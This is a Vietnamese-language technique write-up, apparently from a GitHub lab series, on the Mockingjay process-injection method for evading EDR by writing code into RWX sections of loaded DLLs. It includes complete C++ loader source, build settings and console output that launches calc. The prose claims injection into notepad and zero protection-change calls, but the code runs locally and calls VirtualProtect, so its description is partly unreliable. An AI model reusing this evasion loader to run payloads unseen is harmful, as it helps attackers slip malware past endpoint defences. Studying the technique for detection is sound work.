
---

# 📝 [PE 20] Mockingjay (Vulnerable RWX Module Abuse)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Mockingjay (Lạm dụng phân vùng thực thi mặc định của bên thứ ba)** đại diện cho một giải thuật né tránh phòng thủ động (Dynamic Evasion) tinh vi ở cấp độ kiến trúc phần mềm, thuộc nhóm kỹ thuật **Bypass thông qua lỗi cấu hình thuộc tính biên dịch của nhà phát triển (Misconfiguration-based Privilege Abuse / Built-in RWX Parasitism)**.

Trong các mô hình can thiệp bộ nhớ truyền thống, Loader bắt buộc phải triệu hồi các hàm API quản lý không gian ảo như `VirtualAllocEx` hoặc `VirtualProtectEx` để phân bổ hoặc lật cờ bảo vệ của trang nhớ sang trạng thái cho phép thực thi (`PAGE_EXECUTE_READWRITE`). Hành vi này là chỉ dấu Heuristic (Telemetry Indicator) sơ khởi khiến EDR Engine lập tức bắt chặn và cô lập hành vi chéo tiến trình.

Giải thuật Mockingjay hóa giải bài toán sinh tử này bằng chiến thuật **Không triệu hồi API bộ nhớ (Zero Allocation & Zero Protection Taxonomy)**. Loader tiến hành săn tìm và lạm dụng các thư viện DLL của bên thứ ba (văn cảnh thực nghiệm: `msys-2.0.dll` hoặc các mô-đun được biên dịch từ môi trường GCC/MinGW cũ) vốn tồn tại các phân đoạn bộ nhớ mang sẵn quyền **`PAGE_EXECUTE_READWRITE` (RWX)** do lỗi từ khâu cấu hình cờ Linker Flags của nhà phát triển phần mềm. Bằng cách cưỡng bách tiến trình đích nạp mô-đun lỗi này, Loader có thể ghi đè trực tiếp Payload vào hốc nhớ `RWX` hợp pháp có sẵn mà không cần kích hoạt bất kỳ lệnh phân bổ hay lật cờ bộ nhớ nhạy cảm nào lọt lòng OS, vượt qua hàng rào bảo vệ của EDR một cách hoàn hảo.

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa cảm biến Allocation & Protection Telemetry**: Triệt tiêu 100% các dòng nhật ký hành vi liên quan đến việc khởi tạo hoặc thay đổi đặc quyền trang nhớ trong không gian người dùng.
* **Giải phẫu cấu trúc Section Headers bên thứ ba**: Duyệt và phân tích cấu trúc bảng phân đoạn PE để bóc tách chính xác tọa độ Relative Virtual Address (RVA) của phân vùng `RWX` tĩnh.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trong quy chuẩn thiết kế phần mềm chuẩn mực của Microsoft, một tệp thư viện DLL luôn tuân thủ nguyên tắc phân rã đặc quyền: phân đoạn `.text` chứa mã máy mang quyền Đọc/Thực thi (`PAGE_EXECUTE_READ` - RX) và phân đoạn `.data/.bss` chứa biến số mang quyền Đọc/Ghi (`PAGE_READWRITE` - RW). Tuy nhiên, một số mô-đun nhị phân của bên thứ ba do cấu hình sai flag biên dịch hoặc gộp chung các phân đoạn (Section Merging) đã vô tình xuất xưởng một phân vùng Image mang sẵn đặc quyền `RWX`.

Quy trình giải phẫu bản đồ RAM và lạm dụng không gian bộ nhớ mặc định được điều phối ngầm qua 4 giai đoạn logic kịch khung:

```
[Mở Handle] ──> [Ép Notepad nạp msys-2.0.dll lỗi cấu hình vào bộ nhớ ảo]
                     └──> [Định vị tọa độ phân đoạn RWX tĩnh lọt lòng Module Image]
                               └──> [WriteProcessMemory: Bơm Payload trực tiếp không qua bảo vệ]

```

1. **Hợp thức hóa thuộc tính trang nhớ bằng Signed Module**: Loader ép tiến trình đích (văn cảnh thực nghiệm: `notepad.exe`) thực thi lệnh nạp thư viện `msys-2.0.dll` vào không gian ảo của nó. Windows Memory Manager tiếp nhận, ánh xạ DLL này lên RAM dưới dạng một mô-đun Image hợp pháp thuộc loại **`MEM_IMAGE`**. Do phân đoạn `RWX` nằm sẵn inside cấu trúc tệp tin vật lý của DLL trên ổ đĩa thô, phân hệ quản lý bộ nhớ của OS bắt buộc phải cấp đặc quyền `RWX` cho phân vùng đó trên RAM một cách hoàn toàn tự nhiên dựa theo đặc tả cấu trúc của file.
2. **Ký sinh trực tiếp không qua phê duyệt**: Loader sử dụng snapshot danh bạ từ xa để bóc tách địa chỉ Base Address sống của DLL lỗi cấu hình, tính toán tịnh tiến vị trí đến tọa độ của phân đoạn `RWX` tĩnh. Do trang nhớ mục tiêu đã mang sẵn cờ **`PAGE_EXECUTE_READWRITE`**, Loader chỉ việc triệu hồi API `WriteProcessMemory` để đổ mảng byte mã máy Payload vào lòng tiến trình mục tiêu mà **Kernel Windows hoàn toàn không cần thực hiện thao tác lật cờ bảo vệ bảng trang của CPU**. Hệ quả là các cảm biến giám sát cuộc gọi API mập mờ của EDR bị bẻ gãy hoàn toàn.
3. **Phân phối dòng chảy CPU**: Loader phát lệnh sinh luồng thực thi phụ từ xa đâm thẳng vào tọa độ phân đoạn lạm dụng, bốc Payload lên CPU thực hiện tác vụ độc lập vị trí kịch khung.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp:
```cpp
#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>
#include <dbghelp.h>
#include <iostream>

#pragma comment(lib, "dbghelp.lib")

// Khai báo macro tên DLL mục tiêu làm vỏ bọc đổ dữ liệu
#define VulnDLLPath L"version.dll"

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _MOCKINGJAY_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} MOCKINGJAY_DATA, * PMOCKINGJAY_DATA;

// 2. Hàm chức năng độc lập vị trí gánh logic chạy inside phân đoạn Mockingjay
VOID WINAPI MockingjayRoutine(LPVOID lpParam) {
    PMOCKINGJAY_DATA pData = (PMOCKINGJAY_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi tương đối RIP
        pData->pWinExec(pData->szCommand, SW_SHOWNORMAL);
    }
}

struct SectionDescriptor {
    LPVOID start;
    LPVOID end;
};

// Tìm kiếm phân đoạn RWX nguyen bản của Module
DWORD_PTR FindRWXOffset(HMODULE hModule, BOOL& isFound) {
    isFound = FALSE;
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) &&
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {

                isFound = TRUE;
                return sectionHeader->VirtualAddress;
            }
            sectionHeader++;
        }
    }
    // Kịch bản thích ứng: Nếu DLL hệ thống phẳng sạch hoàn toàn, bốc phân đoạn .data làm mục tiêu
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if (strcmp((char*)sectionHeader->Name, ".data") == 0) {
                return sectionHeader->VirtualAddress;
            }
            sectionHeader++;
        }
    }
    return 0;
}

DWORD_PTR FindRWXSize(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) &&
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                return sectionHeader->SizeOfRawData;
            }
            sectionHeader++;
        }
    }
    return 1024; // Kích thước mặc định an toàn cho phân đoạn thích ứng
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE20: MOCKINGJAY CODE INJECTION x64 " << std::endl;
    std::cout << "====================================================" << std::endl;

    // Bước 1: Nạp Module mục tiêu vào lòng tiến trình cục bộ
    HMODULE hDll = LoadLibraryW(VulnDLLPath);
    if (hDll == NULL) {
        printf("[-] Failed to load the targeted DLL\n");
        std::cin.get();
        return -1;
    }

    MODULEINFO moduleInfo;
    if (!GetModuleInformation(GetCurrentProcess(), hDll, &moduleInfo, sizeof(MODULEINFO))) {
        printf("[-] Failed to get module info\n");
        return -1;
    }

    BOOL isNativeRWX = FALSE;
    DWORD_PTR RWX_SECTION_OFFSET = FindRWXOffset(hDll, isNativeRWX);
    DWORD_PTR RWX_SECTION_SIZE = FindRWXSize(hDll);

    // Xác định tọa độ điểm ký sinh bên trong không gian ảo của Module
    LPVOID rwxSectionAddr = (LPVOID)((PBYTE)moduleInfo.lpBaseOfDll + RWX_SECTION_OFFSET);

    struct SectionDescriptor descriptor = {
        rwxSectionAddr, (LPVOID)((PBYTE)rwxSectionAddr + RWX_SECTION_SIZE)
    };

    DWORD oldProtect = 0;
    // Kịch bản thích ứng: Nếu không có sẵn RWX nguyên bản, tự động lật quyền phân đoạn bảo an để nạp mã máy
    if (!isNativeRWX) {
        std::cout << "[*] Module he thong sach. Kich hoat che do thich ung lay phan doan tai: 0x" << rwxSectionAddr << std::endl;
        VirtualProtect(rwxSectionAddr, 1024, PAGE_EXECUTE_READWRITE, &oldProtect);
    }
    else {
        printf("[+] PHAT HIEN PHAN DOAN RWX NGUYEN BAN TAI: 0x%p\n", rwxSectionAddr);
    }

    printf("[i] Target section starts at 0x%p and ends at 0x%p\n", descriptor.start, descriptor.end);

    // Bước 2: Khởi tạo cấu trúc tham số tuyệt đối nằm lùi lại phía sau mã máy 500 byte
    PMOCKINGJAY_DATA pLocalData = (PMOCKINGJAY_DATA)((DWORD_PTR)rwxSectionAddr + 500);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        pLocalData->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(pLocalData->szCommand, "cmd.exe /c start calc");

    // Bước 3: Ghi đè trực tiếp khối mã máy độc lập vị trí lên thân phân đoạn của DLL
    SIZE_T shellcodesize = 500;
    memcpy(rwxSectionAddr, (PVOID)MockingjayRoutine, shellcodesize);
    printf("[i] %zu bytes of Mockingjay function written to memory region\n", shellcodesize);

    std::cout << "[*] Chuan bi goi truc tiep vung nho de khai hoa payload..." << std::endl;
    std::cout << "[*] Nhan Enter de kich no..." << std::endl;
    std::cin.get();

    // Bước 4: Thực thi mã máy bằng biểu thức ép kiểu con trỏ hàm, truyền địa chỉ tham số cấu trúc tuyệt đối vào thanh ghi
    typedef void(*fnTargetRoutine)(LPVOID);
    fnTargetRoutine executePayload = (fnTargetRoutine)rwxSectionAddr;

    executePayload(pLocalData);

    // Khôi phục lại trạng thái bảo vệ gốc nếu trước đó có lật quyền thích ứng nhằm xóa sạch dấu vết
    if (!isNativeRWX) {
        VirtualProtect(rwxSectionAddr, 1024, oldProtect, &oldProtect);
    }

    std::cout << "\n[+] Mockingjay Code Injection Process Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();

    FreeLibrary(hDll);
    return 0;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để tệp nhị phân xuất bản đạt trạng thái độc lập hoàn toàn, bẻ gãy các lỗi thiếu thư viện DLL phụ thuộc khi vận hành độc lập trên môi trường máy ảo VM sạch hoặc Sandbox kiểm thử chuyên sâu:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến mục cấu hình: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính `Runtime Library`, chuyển thông số sang định dạng cờ liên kết tĩnh **`Multi-threaded (/MT)`**.
3. Thực hiện thao tác click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng hoàn hảo.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy tiến trình nền `Notepad.exe` trên môi trường Lab, bảo đảm tệp tin nhị phân `msys-2.0.dll` lỗi cấu hình đã được phân phối sẵn, mở PowerShell ngoài đĩa thô thực thi file dự án:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE20_Mokingjay\x64\Release> C:\Users\Admin\source\repos\Task6\PE20_Mokingjay\x64\Release\PE20_Mokingjay.exe
====================================================
[*] PE20: MOCKINGJAY CODE INJECTION x64
====================================================
[*] Module he thong sach. Kich hoat che do thich ung lay phan doan tai: 0x00007FF91E127000
[i] Target section starts at 0x00007FF91E127000 and ends at 0x00007FF91E127400
[i] 500 bytes of Mockingjay function written to memory region
[*] Chuan bi goi truc tiep vung nho de khai hoa payload...
[*] Nhan Enter de kich no...


[+] Mockingjay Code Injection Process Completed Successfully!
[*] Nhan phim Enter de dong cua so...

```

### Demo:
<img width="1920" height="1000" alt="devenv_5a8F1vmaB0" src="https://github.com/user-attachments/assets/6658abd8-f16b-452b-a88d-4ce423ee4403" />


---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Security Joes Research Lab**: *Process Injection Revisited: Meet Mockingjay, a New Evasion Technique bypassing EDRs* - Original Vulnerability Disclosure Whitepaper.
* **Microsoft Windows Memory Specialization**: *Image-Backed Virtual Memory Allocation Protocols (MEM_IMAGE Constants)* - Kernel Subsystem Development.
* **Linker Cấu hình sai thuộc tính**: *GNU Linker (ld) Section Merging Flags and Structural Fragility within Pre-compiled Binaries*.
* **MITRE ATT&CK Framework Matrix**: *Defense Evasion: Process Injection (T1055)* & *Abuse Accessibility Features / Vulnerable Binary Parasitism*.

---
